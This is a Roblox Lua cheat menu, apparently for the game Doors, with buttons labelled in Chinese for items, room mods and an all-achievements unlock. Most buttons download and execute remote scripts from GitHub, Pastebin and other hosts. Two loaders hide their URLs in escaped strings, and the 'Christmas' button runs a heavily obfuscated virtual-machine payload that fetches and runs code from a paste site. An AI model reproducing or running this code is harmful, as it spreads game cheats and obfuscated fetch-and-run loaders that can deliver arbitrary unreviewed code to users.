local Lib =
    loadstring(game:HttpGet "https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/discord")()




local window = Lib:Window("DXgui手机 | Discord Lib | 内测")

local main = window:Server("主要","http://www.roblox.com/asset/?id=6031075938")

local itemTab = main:Channel("物品")
	
itemTab:Button(
	"十字架",
	function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/ZepsyyCodesLUA/Utilities/main/Doors/Crucifix.lua"))()
	end
)



itemTab:Button(
	"Seek十字架",
	function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/RmdComunnityScriptsProvider/AngryHub/main/Seek%20Crucifix.lua"))()
	end
)



itemTab:Button(
	"万圣节十字架",
	function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Mye123/MyeWareHub/main/Halloween%20Crucifix"))()
	end
)

itemTab:Button(
	"手电筒(doors,无限电源)",
	function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/SernoxSergal/Sernox-s-Door-Gui/main/InfiniteFlashlight.lua"))()
	end
)
itemTab:Seperator()

itemTab:Button(
	"手电筒(不是doors的)",
	function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/DXuwu/flashlight-lmao/main/flashlight.lua"))()
	end
)

itemTab:Button(
	"灯笼?",
	function()
		loadstring(game:HttpGet("https://pastebin.com/raw/Nn4h2CCv"))()
	end
)


itemTab:Seperator()

itemTab:Button(
	"全成就(我不知道放哪就这了)",
	function()
		for i,v in pairs(require(game.ReplicatedStorage.Achievements)) do
            spawn(function()
                require(game.Players.LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game.RemoteListener.Modules.AchievementUnlock)(nil, i)
            end)
        end
	end
)
itemTab:Seperator()

local modTab = main:Channel("游戏修改")
	
modTab:Button(
	"MC房间",
	function()
		loadstring(game:HttpGet("https://pastebin.com/raw/y2WmccLk"))()
	end
)


modTab:Button(
	"MC房间 2.0",
	function()
		loadstring("\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\77\121\101\49\50\51\47\77\121\101\87\97\114\101\72\117\98\47\109\97\105\110\47\104\105\34\41\41\40\41\10")()
	end
)

modTab:Seperator()

modTab:Button(
	"石头房(doors 第二层装饰什么什么的)",
	function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/iCherryKardes/Doors/main/Floor%202%20Mod"))()
	end
)
		
modTab:Button(
	"101房？",
	function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/DXuwu/replicator-lol/main/abc.txt"))()
	end
)

modTab:Button(
	"圣诞节",
	function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/DXuwu/replicator-lol/main/penguin%20christmas%20crucifix"))()
		loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\77\121\101\49\50\51\47\77\121\101\87\97\114\101\72\117\98\47\109\97\105\110\47\65\68\65\68\65\68\65\34\41\41\40\41\10")()
		_G.WrappingTexture = 4516925393

		do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=getfenv or function()return _ENV;end;local v9=setmetatable;local v10=pcall;local v11=select;local v12=unpack or table.unpack;local v13=tonumber;local function v14(v15,v16)local v17=1;local v18;v15=v4(v3(v15,5),"..",function(v29)if (v1(v29,2)==79) then local v63=0;while true do if (v63==0) then v18=v0(v3(v29,1,1));return "";end end else local v64=v2(v0(v29,16));if v18 then local v76=0;local v77;while true do if (v76==1) then return v77;end if (0==v76) then v77=v5(v64,v18);v18=nil;v76=1;end end else return v64;end end end);local function v19(v30,v31,v32)if v32 then local v65=0 -(369 -(247 + 122));local v66;while true do if (v65==(0 + 0)) then v66=(v30/((2 + 0)^(v31-1)))%(2^(((v32-(1 + 0)) -(v31-1)) + (2 -1)));return v66-(v66%((8 -6) -1));end end else local v67=708 -(556 + 152);local v68;while true do if (v67==(0 + 0)) then v68=(1 + 1)^(v31-1);return (((v30%(v68 + v68))>=v68) and (1 + 0)) or (424 -((1833 -(1135 + 456)) + 182));end end end end local function v20()local v37=0 + 0;local v38;while true do if (v37==0) then v38=v1(v15,v17,v17);v17=v17 + 1;v37=1 + 0;end if (v37==(621 -(171 + (2110 -(358 + 1303))))) then return v38;end end end local function v21()local v39,v40=v1(v15,v17,v17 + (1560 -(839 + 719)));v17=v17 + 1 + 1;return (v40 * (294 -(24 + 14))) + v39;end local function v22()local v41,v42,v43,v44=v1(v15,v17,v17 + 1 + 2);v17=v17 + (7 -3);return (v44 * 16777216) + (v43 * (66875 -(658 + (790 -(92 + 17))))) + (v42 * (812 -556)) + v41;end local function v23()local v45=v22();local v46=v22();return (( -(5 -3) * v19(v46,107 -75)) + ((2 -1) -0)) * (2^(v19(v46,(1284 -(422 + 489)) -(212 + 140),5 + 26) -(2496 -(517 + 956)))) * ((((v19(v46,1,2 + 18) * ((1169 -(395 + 772))^(127 -95))) + v45)/((1 + 1)^(409 -(4 + 29 + 324)))) + 1 + 0);end local function v24(v33)local v47;if  not v33 then local v69=0;while true do if ((0 + 0)==v69) then v33=v22();if (v33==0) then return "";end break;end end end v47=v3(v15,v17,(v17 + v33) -((3 -2) + 0));v17=v17 + v33;local v48={};for v61=1305 -(1205 + (443 -(187 + 157))), #v47 do v48[v61]=v2(v1(v3(v47,v61,v61)));end return v6(v48);end local v25=v22;local function v26(...)return {...},v11("#",...);end local function v27()local v49=1154 -(473 + 681);local v50;local v51;local v52;local v53;local v54;local v55;local v56;local v57;while true do if (v49==(7 -4)) then v56=nil;v57=nil;v49=9 -5;end if (v49~=(0 + 0)) then else v50=0 -0;v51=nil;v49=90 -(35 + 54);end if (v49~=(2 + 0)) then else v54=nil;v55=nil;v49=3;end if (v49==(3 + 1)) then while true do if (v50~=(1570 -(1083 + 484))) then else v57=nil;while true do local v80=0;while true do if ((668 -(504 + 163))~=v80) then else if (v51==2) then for v103=1 + 0,v22() do local v104=0;local v105;local v106;while true do if ((2 -1)==v104) then while true do if (v105==(0 -0)) then v106=v20();if (v19(v106,384 -(50 + 333),2 -1)==(0 + 0)) then local v120=0;local v121;local v122;local v123;local v124;while true do if (v120==(593 -(306 + 286))) then v123=nil;v124=nil;v120=2;end if (v120==(3 -1)) then while true do if (0==v121) then v122=v19(v106,2 + 0,1577 -(1117 + 457));v123=v19(v106,4,80 -(44 + 30));v121=1;end if ((1051 -(165 + 883))==v121) then if (v19(v123,57 -(48 + 6),3 + 0)==(4 -3)) then v124[14 -10]=v57[v124[4]];end v52[v103]=v124;break;end if (v121==(13 -(7 + 4))) then local v148=0;local v149;while true do if (v148~=(1449 -(1373 + 76))) then else v149=0 -0;while true do if (v149==1) then v121=1 + 2;break;end if (v149~=(550 -(246 + 304))) then else local v162=802 -(76 + 726);while true do if (v162==(0 + 0)) then if (v19(v123,1 -0,1)==(1 + 0)) then v124[1 + 1]=v57[v124[1 + 1]];end if (v19(v123,2 + 0,1 + 1)~=1) then else v124[6 -3]=v57[v124[8 -5]];end v162=1895 -(712 + 1182);end if ((206 -(115 + 90))==v162) then v149=1 + 0;break;end end end end break;end end end if (v121==1) then local v150=0 + 0;while true do if (v150~=(0 + 0)) then else v124={v21(),v21(),nil,nil};if (v122==(596 -(406 + 190))) then local v160=0 + 0;while true do if (v160~=0) then else v124[2 + 1]=v21();v124[3 + 1]=v21();break;end end elseif (v122==(1302 -(1197 + 104))) then v124[9 -6]=v22();elseif (v122==2) then v124[1 + 2]=v22() -((349 -(335 + 12))^16);elseif (v122~=(1183 -(825 + 355))) then else local v171=0 -0;local v172;local v173;while true do if (v171~=1) then else while true do if (v172~=(0 + 0)) then else v173=1450 -(788 + 662);while true do if (v173==(0 + 0)) then v124[2 + 1]=v22() -((2 + 0)^16);v124[4]=v21();break;end end break;end end break;end if (v171==(421 -(254 + 167))) then v172=0;v173=nil;v171=2 -1;end end end v150=2 -1;end if (v150==(1 -0)) then v121=1 + 1;break;end end end end break;end if (0==v120) then v121=0 + 0;v122=nil;v120=3 -2;end end end break;end end break;end if (v104==(1750 -(1672 + 78))) then v105=1919 -(494 + 1425);v106=nil;v104=1;end end end for v107=1,v22() do v53[v107-(2 -1)]=v27();end for v109=1,v22() do v54[v109]=v22();end return v55;end break;end if (v80==0) then if (v51~=1) then else local v100=823 -(93 + 730);local v101;while true do if (0==v100) then v101=0;while true do if (v101==(592 -(536 + 55))) then for v115=1 + 0,v56 do local v116=0 + 0;local v117;local v118;local v119;while true do if (v116~=(0 + 0)) then else local v130=1844 -(443 + 1401);while true do if ((1 + 0)==v130) then v116=1 + 0;break;end if (0~=v130) then else v117=73 -(12 + 61);v118=nil;v130=1 -0;end end end if (v116~=(328 -(18 + 309))) then else v119=nil;while true do if (v117==(2 -1)) then if (v118==(1 + 0)) then v119=v20()~=(0 -0);elseif (v118==(4 -2)) then v119=v23();elseif (v118==3) then v119=v24();end v57[v115]=v119;break;end if (v117==0) then local v143=0 -0;local v144;while true do if (v143~=0) then else v144=0;while true do if (v144~=0) then else local v159=0 + 0;while true do if (v159~=0) then else v118=v20();v119=nil;v159=1 + 0;end if (v159~=(2 -1)) then else v144=1437 -(1217 + 219);break;end end end if (v144==(1937 -(1315 + 621))) then v117=1;break;end end break;end end end end break;end end end v55[353 -(293 + 57)]=v20();v101=2;end if (v101~=(0 -0)) then else local v114=0 -0;while true do if (v114==(606 -(506 + 99))) then v101=119 -(96 + 22);break;end if (v114==(0 -0)) then v56=v22();v57={};v114=1 + 0;end end end if (v101==(8 -6)) then v51=1698 -(397 + 1299);break;end end break;end end end if (v51~=0) then else local v102=0;while true do if (v102==(1 + 0)) then v54={};v55={v52,v53,nil,v54};v102=2 + 0;end if (v102==2) then v51=1;break;end if ((1995 -(974 + 1021))==v102) then local v111=0 -0;while true do if (v111~=0) then else v52={};v53={};v111=1 + 0;end if (v111==1) then v102=1 -0;break;end end end end end v80=2 -1;end end end break;end if (v50==(0 + 0)) then local v78=0;while true do if (v78==1) then v50=715 -(595 + 119);break;end if (v78==0) then v51=896 -(806 + 90);v52=nil;v78=1 + 0;end end end if (v50==2) then local v79=0 -0;while true do if (v79==(1 + 0)) then v50=5 -2;break;end if ((1702 -(742 + 960))~=v79) then else v55=nil;v56=nil;v79=1;end end end if (v50==1) then v53=nil;v54=nil;v50=2;end end break;end if (v49==(1 -0)) then v52=nil;v53=nil;v49=1 + 1;end end end local function v28(v34,v35,v36)local v58=v34[1];local v59=v34[2];local v60=v34[3];return function(...)local v70=0;local v71;local v72;local v73;local v74;local v75;while true do if (v70==0) then v71=1;v72= -1;v70=1;end if (v70==3) then A,B=v26(v10(v75));if  not A[1] then local v81=0;local v82;while true do if (v81==0) then v82=v34[4][v71] or "?";error("Script error at ["   .. v82   .. "]:"   .. A[2]);break;end end else return v12(A,2,B);end break;end if (1==v70) then v73={...};v74=v11("#",...) -1;v70=2;end if (v70==2) then v75=nil;function v75()local v83=v58;local v84=Const;local v85=v59;local v86=v60;local v87=v26;local v88={};local v89={};local v90={};for v94=1224 -(590 + 634),v74 do if ((((484 -(333 + 5)) + 23)<=(8067 -4324)) and (v94>=v86)) then v88[v94-v86]=v73[v94 + 1 + 0];else v90[v94]=v73[v94 + 1];end end local v91=(v74-v86) + (1 -0);local v92;local v93;while true do local v95=0 -0;local v96;local v97;while true do if (((1855 -(781 + (1206 -(175 + 66))))<915) and (v95==(0 + 0))) then v96=0;v97=nil;v95=1;end if ((v95==1) or (2022<(2629 -(1615 + 77 + 199)))) then while true do if ((v96==(0 -0)) or ((1154 -(8 + 590))<=(734 -371))) then v97=1257 -((2129 -(1139 + 314)) + (2644 -2063));while true do if ((v97==(393 -(147 + 246))) or ((7920 -4726)>(23 + 3589))) then local v112=0;while true do if ((v112==(1027 -(663 + 89 + 274))) or ((423 + 144 + 285)>=(268 + 3164))) then v97=1;break;end if (((4072 -(663 + 274))>=(146 + (394 -237))) and (v112==0)) then v92=v83[v71];v93=v92[1 + (756 -(739 + 17))];v112=1;end end end if ((119==((1267 -(1202 + 55)) + 109)) and (v97==(1 + 0 + 0))) then if ((((5923 -(1546 + 190)) -(247 + 387))<=(10587 -5758)) and (v93<=2)) then if ((v93<=0) or (2787>(13396 -10468))) then local v125=0;local v126;local v127;local v128;local v129;while true do if (((114 + 786)==(968 -(45 + 23))) and (v125==2)) then while true do if ((((835 + 1330) -(2149 -1283))>=1100) and (v126==0)) then local v151=936 -(761 + 175);while true do if ((1525==(2442 -(67 + 850))) and (v151==(419 -(163 + 255)))) then v126=(439 + 158) -(16 + 580);break;end if ((v151==(0 + 0)) or ((5682 -2560)<=(2627 -(524 + 578)))) then v127=0 + 0;v128=nil;v151=3 -2;end end end if (((2842 -(233 + 430))<=(5960 -(424 + 555))) and (v126==(1239 -(1139 + 99)))) then v129=nil;while true do if (((5523 -3311)<=4181) and (0==v127)) then local v156=0 + 0;while true do if (((22 + 4665)>=(2641 -(616 + 1231))) and (v156==(0 + 0))) then local v163=0 + (31 -(24 + 7));while true do if (((1462 -((363 -(8 + 37)) + 198))<(787 + 690)) and (v163==(0 -0))) then v128=v92[2];v129=v90[v92[1071 -(1004 + 64)]];v163=1 + 0;end if (((1 + 0)==v163) or ((558 + 516)>=(290 + 2302))) then v156=1 + (971 -(69 + 902));break;end end end if (((9 + 668)<(5628 -4277)) and (v156==(2 -1))) then v127=1 + 0;break;end end end if ((995==995) and (v127==(3 -2))) then v90[v128 + 1 + 0]=v129;v90[v128]=v129[v92[1041 -(629 + 408)]];break;end end break;end end break;end if (((3425 -(1022 + 770))<(4144 -(122 + 521))) and (v125==(0 -0))) then v126=1547 -(241 + 87 + 1219);v127=nil;v125=2 -(3 -2);end if (((2285 -(529 + 884))>((314 + 1240) -(1351 + 104))) and (v125==(514 -(194 + 319)))) then v128=nil;v129=nil;v125=1 + 1;end end elseif (((1413 -(102 + 894))<=2088) and (v93>1)) then v90[v92[4 -2]]=v92[2 + 1];else v90[v92[2]]=v36[v92[1 + 2]];end elseif (((6225 -(1813 + 84))<(5112 -(43 + 461))) and (v93<=(1 + 3))) then if ((3282==(7656 -4374)) and (v93==(5 -2))) then local v133=(0 -0) -0;local v134;local v135;local v136;while true do if ((v133==(1813 -(1171 + 642))) or ((13679 -8814)<=(4788 -(155 + 752)))) then v134=0 + 0;v135=nil;v133=1 + (0 -0);end if ((v133==(353 -(177 + 175))) or ((959 -(35 + 4))==1314)) then v136=nil;while true do if (((4152 -1610)<(13646 -10725)) and (v134==0)) then v135=465 -(389 + 76);v136=nil;v134=1;end if ((v134==1) or ((6230 -(288 + 1444))==((8439 -5137) -(38 + 337)))) then while true do if ((((5637 + 6520) -(4273 + 4783))>(835 + 829)) and ((0 + 0)==v135)) then v136=v92[2];v90[v136]=v90[v136](v12(v90,v136 + 1 + 0,v72));break;end end break;end end break;end end else do return;end end elseif ((((4696 + 477) -3302)<=4792) and (v93==(1 + 4))) then v90[v92[912 -((455 -(15 + 313)) + 783)]]();else local v137=0;local v138;local v139;local v140;local v141;while true do if ((((7643 -(87 + 95)) -2708)>=(1883 -(819 + 787))) and (0==v137)) then local v145=0;while true do if (((1980 + 2719)>=(12500 -8151)) and (v145==(3 -2))) then v137=1272 -(923 + 348);break;end if ((v145==(0 + 0)) or ((6413 -1903)==(1173 + 2472))) then v138=v92[2 + 0];v139,v140=v87(v90[v138](v12(v90,v138 + 1 + (708 -(94 + 614)),v92[3])));v145=1278 -((1838 -(985 + 151)) + 248 + 327);end end end if (((13029 -(10099 -(169 + 416)))>2620) and (v137==(3 -2))) then local v146=973 -(291 + 682);while true do if (((3824 -(1242 + 132))>=(547 + 564)) and (v146==(1 + 0))) then v137=7 -5;break;end if ((((1973 + 11201) -8350)>157) and (v146==(0 + 0))) then v72=(v140 + v138) -(1021 -(275 + 745));v141=0 -0;v146=1 + 0;end end end if (((11696 -7678)>=(5025 -1127)) and (v137==2)) then for v152=v138,v72 do local v153=1597 -(1331 + 266);local v154;while true do if ((3476<=(11092 -6581)) and (v153==(0 + 0 + 0))) then v154=0 -(0 + 0);while true do if ((v154==(0 + 0)) or ((11078 -6556)<(45 + 146))) then v141=v141 + (1478 -(944 + 533));v90[v152]=v139[v141];break;end end break;end end end break;end end end v71=v71 + 1 + 0;break;end end break;end end break;end end end end v70=3;end end end;end return v28(v27(),{},v16)();end v14("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403253O00682O7470733A2O2F3O772E6B6C677274682E696F2F70617374652F79396F71652F72617700083O0012013O00013O001201000100023O00202O000100010003001202000300044O0006000100034O00035O00022O00053O000100012O00043O00017O00083O00023O00023O00023O00023O00023O00023O00023O00033O00",v8());end
	end
)

local zixun = main:Channel("资讯")

zixun:Label("作者DX")
zixun:Label("内测阶段已开启白名单")
